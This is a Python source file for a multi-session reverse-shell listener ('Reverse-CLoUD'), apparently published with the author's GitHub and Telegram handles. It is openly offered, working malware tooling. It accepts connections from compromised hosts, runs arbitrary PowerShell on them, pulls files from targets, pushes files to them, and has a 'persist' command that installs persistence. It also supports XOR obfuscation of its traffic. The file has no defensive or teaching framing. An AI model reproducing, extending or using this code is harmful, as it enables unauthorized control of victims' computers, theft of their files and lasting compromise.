#######################################################
####   MyGitHub : https://github.com/The-Lxx-CLoUD ####
####                                               ####
####     MyTelegram : https://t.me/lxxcloud        ####
#######################################################

import os
import time
import socket
import struct
import threading
import base64
import queue

LHOST = "0.0.0.0"   # dont change
LPORT = 1080        # port
XOR_KEY = 0           # Same password between client and server
RESP_TIMEOUT = 60     # Response waiting timeout (seconds)

HELP = """
 ⚙️ Reverse shell management ⚙️ 
  commands⤵️⤵️

  1- sessions                   list connected sessions
  2- use <id>                   open a shell on that session (Ex : use 0 or use 1)
  3- exit                       quit the listener



 📩 you can run this Commans to  client 📩 
 commands⤵️⤵️

  help                          show this help
  pwd                           print working directory
  cd <dir>                      navigate the target filesystem (Ex: cd C:/Users/MMD/Desktop)
  download <remote_path>        pull a file from the target  (Ex: your in Desktop // download lolo.png)
  upload <local_P> <remote_P>   push a local file to the target (Ex: upload /home/.../s.png C:/.../Desktop
  persist                       install persistence on the target 
  exit                          close the session
  back                          detach (keep session alive)
  anything else                 runs in PowerShell on the target
  and you can use all cmd and powershell commands ... 🔥 """

sessions = {}
lock = threading.Lock()
next_id = 0


class Session:
    def __init__(self, cid, sock, addr):
        self.cid = cid
        self.sock = sock
        self.addr = addr
        self.q = queue.Queue()
        self.attached = False


def x(data: bytes) -> bytes:
    if not XOR_KEY:
        return data
    return bytes(b ^ XOR_KEY for b in data)


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("connection closed")
        buf += chunk
    return buf


def recv_msg(sock) -> str:
    (n,) = struct.unpack(">I", recv_exact(sock, 4))
    return x(recv_exact(sock, n)).decode("utf-8", errors="replace").strip()


def send_msg(sock, text: str) -> None:
    payload = x(text.encode("utf-8", errors="replace"))
    sock.sendall(struct.pack(">I", len(payload)) + payload)


def drain(sess):
    """Drop stale queued lines before a new command."""
    while True:
        try:
            sess.q.get_nowait()
        except queue.Empty:
            break

####     MyTelegram : https://t.me/lxxcloud        ####

def wait_response(sess):
    try:
        return sess.q.get(timeout=RESP_TIMEOUT)
    except queue.Empty:
        return None


def client_thread(cid, sock, addr):
    sess = Session(cid, sock, addr)
    with lock:
        sessions[cid] = sess

    
    try:
        sock.settimeout(8)
        hello = recv_msg(sock)
        sock.settimeout(None)
    except Exception:
        hello = None

    if hello and hello.startswith("HELLO"):
        print(f"[*] Session #{cid} from {addr[0]}:{addr[1]} -> {hello}")
    else:
        print(f"[!] Session #{cid} from {addr[0]}:{addr[1]}: "
              f"client did not send HELLO ({hello!r}). "
              f"You are running an OLD client - use the new reverse_shell.py")

    try:
        while True:
            msg = recv_msg(sock)
            sess.q.put(msg)
            if not sess.attached:
                print(f"[{cid}] {msg}")
    except (ConnectionError, OSError):
        pass
    except Exception as e:
        print(f"[!] Session #{cid} error: {e}")
    finally:
        with lock:
            sessions.pop(cid, None)
        try:
            sock.close()
        except Exception:
            pass
        print(f"[-] Session #{cid} closed")

####     MyTelegram : https://t.me/lxxcloud        ####

def shell(cid):
    with lock:
        sess = sessions.get(cid)
    if not sess:
        print(f"[!] no such session #{cid}")
        return
    sess.attached = True
    drain(sess)                      
    print(f"[*] Attached to session #{cid}. Type 'help' for commands.")
    try:
        while True:
            try:
                cmd = input(f"👁️ Runing-shell#{cid}> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not cmd:
                continue
            low = cmd.lower()
            if low in ("help", "?"):
                print(HELP)
            elif low in ("back", "sessions"):
                break
            elif low == "exit":
                send_msg(sess.sock, "exit")
                time.sleep(0.3)
                break
            elif low.startswith("download "):
                remote = cmd.split(maxsplit=1)[1].strip()
                send_msg(sess.sock, f"download {remote}")
                resp = wait_response(sess)
                if resp and resp.startswith("FILE:"):
                    raw = base64.b64decode(resp[5:])
                    local = os.path.basename(remote) or "download.bin"
                    with open(local, "wb") as fo:
                        fo.write(raw)
                    print(f"[+] saved {len(raw)} bytes -> {local}")
                else:
                    print(resp or "[!] no response (timeout)")
            elif low.startswith("upload "):
                parts = cmd.split(maxsplit=2)
                if len(parts) < 3:
                    print("[!] usage: upload <local> <remote>")
                    continue
                local, remote = parts[1], parts[2]
                if not os.path.isfile(local):
                    print(f"[!] local file not found: {local}")
                    continue
                with open(local, "rb") as fin:
                    b64 = base64.b64encode(fin.read()).decode()
                send_msg(sess.sock, f"upload {remote}")
                send_msg(sess.sock, b64)
                resp = wait_response(sess) 
                print(resp or "[!] no response (timeout)")
            else:
                send_msg(sess.sock, cmd)
                resp = wait_response(sess)
                print(resp or "[!] no response (timeout)")
    finally:
        sess.attached = False


def accept_loop(srv):
    global next_id
    while True:
        try:
            sock, addr = srv.accept()
        except OSError:
            break
        cid = next_id
        next_id += 1
        threading.Thread(target=client_thread,
                         args=(cid, sock, addr), daemon=True).start()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LHOST, LPORT))
    srv.listen(10)
    print(f"[*] MyGithub --▶️ https://github.com/The-Lxx-CLoUD ")
    print(f"[*] MyTelegram --▶️  https://t.me/lxxcloud ")
    print(f"[*] Status ⤵️")
    print(f"[*] Reverse-CLoUD on Listening {LHOST}:{LPORT}  (XOR={XOR_KEY})")
    threading.Thread(target=accept_loop, args=(srv,), daemon=True).start() ####     MyTelegram : https://t.me/lxxcloud     
 

    while True:
        try:
            cmd = input("💡 listener> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd:
            continue
        low = cmd.lower()
        if low == "sessions":
            with lock:
                if not sessions:
                    print("  (no sessions)")
                for cid, s in sessions.items():
                    print(f"  #{cid}  {s.addr[0]}:{s.addr[1]}  "
                          f"{'[in use]' if s.attached else ''}")
        elif low.startswith("use "):
            try:
                cid = int(cmd.split()[1])
            except (ValueError, IndexError):
                print("[!] usage: use <id>")
                continue
            shell(cid)
        elif low == "exit":
            break
        else:
            print(HELP)


if __name__ == "__main__":
    main()
